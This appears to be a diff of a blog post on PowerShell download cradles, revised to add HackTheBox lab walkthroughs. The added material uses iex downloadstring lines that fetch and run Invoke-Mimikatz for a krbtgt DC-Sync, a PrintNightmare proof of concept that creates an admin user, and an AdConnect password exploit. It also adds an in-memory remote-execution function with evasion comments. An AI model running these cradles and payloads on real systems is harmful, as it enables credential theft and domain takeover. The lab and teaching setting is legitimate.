@@ -13,7 +13,7 @@ PowerShell has revolutionized system administration and automation. One of its p
 
 ## What is a PowerShell Download Cradle? {#what-is-a-powershell-download-cradle}
 
-A PowerShell download cradle is a technique that enables downloading and executing code directly in memory without writing to disk. This approach can help bypass security mechanisms while providing efficient code execution capabilities.
+A PowerShell download cradle is a technique that enables downloading and executing code directly in memory without writing to disk. This approach can help bypass security mechanisms.
 
 
 ## Core Components and Techniques {#core-components-and-techniques}
@@ -26,14 +26,18 @@ A PowerShell download cradle is a technique that enables downloading and executi
 -   `System.Net.WebClient`: .NET class for web server interactions
 
 
-### Basic Syntax Example {#basic-syntax-example}
+### Basic Syntax Example using Invoke-Mimikatz: {#basic-syntax-example-using-invoke-mimikatz}
 
-```powershell
-powershell.exe -NoP -C "IEX(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"
-```
+-   **Load Script into memory**:
+    -
+
+    -   {{< figure src="/ox-hugo/2024-11-12-103931_.png" >}}
+
+-   **Running Invoke-Mimikatz from memory**:
+    -   {{< figure src="/ox-hugo/2024-11-12-104010_.png" >}}
 
 
-## Common Download Cradle Examples {#common-download-cradle-examples}
+## Common Download Cradle Examples: {#common-download-cradle-examples}
 
 
 ### Basic WebClient Method {#basic-webclient-method}
@@ -67,7 +71,7 @@ iex $h.responseText
 ```
 
 
-### Advanced Techniques {#advanced-techniques}
+### Advanced Download Cradle Techniques: {#advanced-download-cradle-techniques}
 
 ```powershell
 # DNS TXT Record Method
@@ -82,7 +86,7 @@ $a.command.a.execute | iex
 ```
 
 
-## Implementation Guide {#implementation-guide}
+## Creating a Secure Download Cradle: {#creating-a-secure-download-cradle}
 
 
 ### Basic Setup {#basic-setup}
@@ -94,66 +98,156 @@ $a.command.a.execute | iex
     ```
 
 
-### Creating a Secure Download Cradle {#creating-a-secure-download-cradle}
+### Secure Download Cradle Code: {#secure-download-cradle-code}
 
-When implementing download cradles in a production environment, it's crucial to include proper error handling, logging, and security checks. The following example demonstrates a more robust implementation for in-memory execution:
+Here's a complete, production-ready download cradle implementation that incorporates logging, error handling, and security controls:
 
 ```powershell
 function Invoke-SecureDownloadCradle {
+    # Enable advanced function features like -Verbose
+    [CmdletBinding()]
     param (
-        [Parameter(Mandatory=$true)][string] $Url,
-        [Parameter(Mandatory=$false)][string] $UserAgent = "PowerShell/SecurityAudit",
-        [Parameter(Mandatory=$false)][int] $Timeout = 30000
+        # Required URL parameter for the script to download
+        [Parameter(Mandatory=$true)]
+        [string]$Url,
+
+        # Optional custom User-Agent to avoid detection or meet requirements
+        [Parameter(Mandatory=$false)]
+        [string]$UserAgent = "PowerShell/SecurityAudit",
+
+        # Optional timeout in milliseconds (default 30 seconds)
+        [Parameter(Mandatory=$false)]
+        [int]$Timeout = 30000,
+
+        # Optional switch to enable Windows Event Log logging
+        [Parameter(Mandatory=$false)]
+        [switch]$EnableLogging
     )
-    
+
+    # Internal logging function to handle both event logs and verbose output
+    function Write-Log {
+        param($Message)
+
+        if ($EnableLogging) {
+            $logParams = @{
+                LogName = 'Application'     # Write to Windows Application log
+                Source = 'SecureDownloadCradle'
+                EventId = 1000
+                EntryType = 'Information'
+                Message = $Message
+            }
+
+            try {
+                Write-EventLog @logParams
+            } catch {
+                Write-Warning "Logging failed: $_"
+            }
+        }
+
+        Write-Verbose $Message    # Always write to verbose stream
+    }
+
     try {
-        # Configure WebClient with security in mind
+        Write-Log "Starting download from: $Url"
+
+        # Force TLS 1.2 for security and reset cert callback to default
+        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
+
+        # Initialize WebClient with security settings
         $webClient = New-Object System.Net.WebClient
         $webClient.Headers.Add("User-Agent", $UserAgent)
-        
-        # Enforce TLS 1.2
-        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-        
-        # Download and execute in memory
+        # Configure system proxy settings automatically
+        $webClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
+        $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+
+        Write-Log "Downloading content..."
         $scriptContent = $webClient.DownloadString($Url)
-        
-        # Execute in memory
+        Write-Log "Content downloaded successfully"
+
+        # Execute the downloaded content safely using InvokeCommand
+        Write-Log "Executing script in memory"
         $ExecutionContext.InvokeCommand.InvokeScript($false, [scriptblock]::Create($scriptContent), $null, $null)
-        
+        Write-Log "Execution completed successfully"
+
+    } catch [System.Net.WebException] {
+        # Handle network-specific errors separately
+        $errorMsg = "Network error occurred: $($_.Exception.Message)"
+        Write-Log $errorMsg
+        throw $errorMsg
+
     } catch {
-        Write-Error "Download cradle execution failed: $_"
+        # Handle all other errors
+        $errorMsg = "Unexpected error occurred: $_"
+        Write-Log $errorMsg
+        throw $errorMsg
+
     } finally {
-        $webClient.Dispose()
+        # Ensure proper cleanup of resources
+        if ($webClient) {
+            $webClient.Dispose()
+            Write-Log "WebClient disposed"
+        }
     }
 }
 ```
 
-This implementation includes several important security features:
+**This implementation includes**:
 
--   Parameter validation for the URL and optional parameters
+-   Comprehensive error handling
+-   Event logging (when enabled - requires admin privileges as requires REG change)
 -   TLS 1.2 enforcement
--   Custom User-Agent support for tracking/auditing
--   Structured error handling with `try/catch` blocks
--   Proper cleanup with `Dispose()`
--   Pure in-memory execution without touching disk
+-   Proper proxy handling
+-   Certificate validation
+-   Resource cleanup
+-   Verbose output support
 
-Example usage:
+
+#### Example usage without logging: {#example-usage-without-logging}
 
 ```powershell
-# Basic usage
-Invoke-SecureDownloadCradle -Url "https://internal.repo/scripts/diagnostic.ps1"
 
-# With custom User-Agent and timeout
-Invoke-SecureDownloadCradle -Url "https://internal.repo/scripts/update.ps1" `
-    -UserAgent "CompanyName/UpdateService" `
-    -Timeout 60000
+#Import Script
+. .\Invoke-SecureDownloadCradle.ps1
+
+#Run
+Invoke-SecureDownloadCradle -Url "http://[IP]/[SCRIPT].ps1" -Verbose
 ```
 
+-   {{< figure src="/ox-hugo/2024-11-12-100101_.png" >}}
 
-## Real-World Examples from HackTheBox {#real-world-examples-from-hackthebox}
+
+#### Example usage with logging: {#example-usage-with-logging}
+
+```powershell
+
+#Import Script
+. .\Invoke-SecureDownloadCradle.ps1
+
+# Create Event Source
+New-EventLog -LogName Application -Source "SecureDownloadCradle"
+
+#Run
+Invoke-SecureDownloadCradle -Url "http://[IP]/[SCRIPT].ps1" -Verbose
+
+# Read the logs
+Get-WinEvent -LogName Application | Where-Object {$_.ProviderName -eq "SecureDownloadCradle"}
+```
+
+-   {{< figure src="/ox-hugo/2024-11-12-100912_.png" >}}
+
+-   ~~Notes~~: A custom user agent can also be passed:
+    -   `-UserAgent "CompanyName/UpdateService"`
 
 
-### Monteverde Machine: Running Remote Exploits {#monteverde-machine-running-remote-exploits}
+## Real-World Examples Of Download-Cradle Use HackTheBox {#real-world-examples-of-download-cradle-use-hackthebox}
+
+-   I will often use download cradles on hack the box and here are some recent examples:
+
+
+### Monteverde Box: Extracting the Administrator Password for Azure: {#monteverde-box-extracting-the-administrator-password-for-azure}
+
+-   ~~Full Walkthrough~~: <https://bloodstiller.com/walkthroughs/monteverde-box/>
 
 In this example, we used a download cradle to execute AdConnect exploitation directly in memory:
 
@@ -165,8 +259,9 @@ iex(new-object net.webclient).downloadstring('http://10.10.14.46:9000/AdConnectP
 -   As the exploit is run in memory we get the administrators password without writing to disk.
 
 
-### Certified Box: Advanced Mimikatz Usage {#certified-box-advanced-mimikatz-usage}
+### Certified Box: Advanced Mimikatz Usage to perform a DC-Sync Attack: {#certified-box-advanced-mimikatz-usage-to-perform-a-dc-sync-attack}
 
+-   ~~Full Walkthrough~~: <https://bloodstiller.com/walkthroughs/certified-box/> Coming soon (it's still in release arena. )
 -   Note this is not a spoiler as this is done post exploitation.
 
 
@@ -187,10 +282,14 @@ iex(new-object net.webclient).downloadstring('http://10.10.14.24:9000/Invoke-Mim
 ```
 
 -   {{< figure src="/ox-hugo/2024-11-10-134628_.png" >}}
--   +Note+: This will hang for a little bit, so just be patient.
+-   ~~Note~~: This will hang for a little bit, so just be patient.
 
 
 #### Performing DC-Sync Attack {#performing-dc-sync-attack}
+
+-   Now that mimikatz is loaded into memory we can use it like we normally would and pass it arguments.
+
+<!--listend-->
 
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:krbtgt /domain:administrator.htb"'
@@ -199,23 +298,58 @@ Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:krbtgt /doma
 -   {{< figure src="/ox-hugo/2024-11-10-135022_.png" >}}
 
 
+### Driver Box: Running PrintNightmare POC from a download cradle: {#driver-box-running-printnightmare-poc-from-a-download-cradle}
+
+-   ~~Full Walkthrough~~: <https://bloodstiller.com/walkthroughs/driver-box/> Coming soon (it's still in release arena. )
+
+-   **Start python server to host the script**:
+    ```bash
+       python3 -m http.server 9000
+    ```
+
+    -   {{< figure src="/ox-hugo/2024-11-11-135448_.png" >}}
+    -   ~~Note~~: I have this command aliased to `pws`
+
+-   **Use the download cradle to load the POC directly into memory**:
+    ```powershell
+      iex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/CVE-2021-1675.ps1')
+    ```
+
+    -   {{< figure src="/ox-hugo/2024-11-11-135533_.png" >}}
+
+-   **Execute the script from memory to create new user &amp; add them to the admins**:
+    ```powershell
+      Invoke-Nightmare -NewUser "bloodstiller" -NewPassword "bl00dst1ll3r!" -DriverName "PrintIt"
+    ```
+
+    -   {{< figure src="/ox-hugo/2024-11-11-135700_.png" >}}
+
+-   **Verify the user has been added**:
+    ```powershell
+      net user bloodstiller
+    ```
+
+    -   {{< figure src="/ox-hugo/2024-11-11-135721_.png" >}}
+
+
 ## Security Considerations {#security-considerations}
 
 
 ### Detection Methods {#detection-methods}
 
-Modern security solutions detect download cradles through several means:
-
--   PowerShell logging and ScriptBlock logging
--   Network traffic analysis (especially `.DownloadString` patterns)
--   AMSI integration in PowerShell 5.0+
--   EDR behavioral analysis
--   Memory scanning for known patterns
+-   **Modern security solutions detect download cradles through several means**:
+    -   PowerShell logging and ScriptBlock logging
+    -   Network traffic analysis (especially `.DownloadString` patterns)
+    -   AMSI integration in PowerShell 5.0+
+    -   EDR behavioral analysis
+    -   Memory scanning for known patterns
 
 
 ### Common Restrictions {#common-restrictions}
 
-Organizations often implement:
+-   **Organizations often implement**:
+
+<!--listend-->
 
 ```powershell
 # Execution Policy
@@ -250,167 +384,3 @@ New-AppLockerPolicy -RuleType Path -Deny -Path "%SYSTEM32%\WindowsPowerShell\*\p
     -   Implement HTTPS inspection
     -   Block outbound PowerShell connections
     -   Monitor for unusual PowerShell network activity
-
-
-### Legitimate Use Cases {#legitimate-use-cases}
-
--   Download cradles aren't just for security testing - they're valuable tools for system administrators and developers in enterprise environments. Here are some common legitimate scenarios:
-
-
-#### Configuration Management {#configuration-management}
-
-Configuration management requires frequent updates across multiple systems. Using download cradles ensures all systems stay in sync with the central repository.
-
-```powershell
-# Example: Downloading and applying configuration from internal repository
-$config = Invoke-WebRequest -Uri "https://internal.repo/configs/web-server.json"
-Set-ServerConfiguration -InputObject ($config.Content | ConvertFrom-Json)
-```
-
-
-#### Automated Patching {#automated-patching}
-
-Automated patch management is crucial for maintaining system security. This example shows how to safely download and track patch installations.
-
-```powershell
-# Example: Downloading and applying patches from approved source
-$patches = Get-PatchList -Environment "Production"
-foreach ($patch in $patches) {
-    Start-BitsTransfer -Source $patch.Uri -Destination "C:\Updates"
-    # Implement verification and logging
-    Write-Log "Downloaded patch: $($patch.Name)"
-}
-```
-
-
-#### Remote Diagnostics {#remote-diagnostics}
-
-When troubleshooting remote systems, being able to run diagnostic scripts directly from a central repository saves time and ensures consistency.
-
-```powershell
-# Example: Running diagnostic scripts from central repository
-$diagnostic = Invoke-WebRequest -Uri "https://tools.internal/diagnostics/memory-check.ps1" `
-    -Headers @{"Authorization" = "Bearer $token"} `
-    -UseDefaultCredentials
-if (Test-ScriptSignature $diagnostic.Content) {
-    Invoke-Expression $diagnostic.Content
-}
-```
-
-
-## Best Practices {#best-practices}
-
-Implementing download cradles securely requires attention to several key areas. Here's a comprehensive guide to best practices:
-
-
-### Code Implementation {#code-implementation}
-
-
-#### Error Handling {#error-handling}
-
-Robust error handling is crucial for production environments. This example shows how to handle common failure scenarios while maintaining security.
-
-```powershell
-try {
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("User-Agent", "Corporate-Updater/1.0")
-    $webClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
-    $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-
-    # Implement timeout
-    $webClient.Timeout = 30000 # 30 seconds
-
-    # Download with certificate validation
-    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-    $script = $webClient.DownloadString($url)
-
-    # Verify signature before execution
-    if (Test-ScriptSignature $script) {
-        Invoke-Expression $script
-    }
-} catch [System.Net.WebException] {
-    Write-Error "Network error: $($_.Exception.Message)"
-} catch {
-    Write-Error "Unexpected error: $_"
-} finally {
-    $webClient.Dispose()
-}
-```
-
-
-#### Logging and Monitoring {#logging-and-monitoring}
-
-Proper logging is essential for troubleshooting and audit trails. This implementation provides detailed logging of all download operations.
-
-```powershell
-function Start-ScriptDownload {
-    param($Uri)
-
-    $EventParams = @{
-        LogName = 'Application'
-        Source = 'ScriptDownloader'
-        EventId = 1000
-        EntryType = 'Information'
-    }
-
-    Write-EventLog @EventParams -Message "Starting download from: $Uri"
-    # Implement download logic
-    Write-EventLog @EventParams -Message "Download completed: $Uri"
-}
-```
-
-
-### Security Measures {#security-measures}
-
-
-#### Certificate Validation {#certificate-validation}
-
-Always validate certificates to prevent man-in-the-middle attacks. These settings ensure proper TLS configuration.
-
-```powershell
-# Ensure proper certificate validation
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-```
-
-
-#### Hash Verification {#hash-verification}
-
-Verify file integrity using hash checks. This function provides a reusable way to validate downloaded content.
-
-```powershell
-function Test-FileHash {
-    param(
-        [string]$FilePath,
-        [string]$ExpectedHash
-    )
-
-    $actualHash = Get-FileHash -Path $FilePath -Algorithm SHA256
-    return $actualHash.Hash -eq $ExpectedHash
-}
-```
-
-
-### Operational Guidelines {#operational-guidelines}
-
-Following these guidelines ensures your download cradles remain secure and maintainable over time:
-
-1.  **Source Control**
-    -   Maintain scripts in version control
-    -   Use approved internal repositories
-    -   Implement change management procedures
-
-2.  **Documentation**
-    -   Document all implemented download cradles
-    -   Maintain usage logs
-    -   Keep deployment documentation updated
-
-3.  **Testing**
-    -   Test in development environment first
-    -   Verify behavior with security tools enabled
-    -   Validate against current security policies
-
-4.  **Maintenance**
-    -   Regular review of implemented cradles
-    -   Update security certificates
-    -   Monitor for deprecated methods
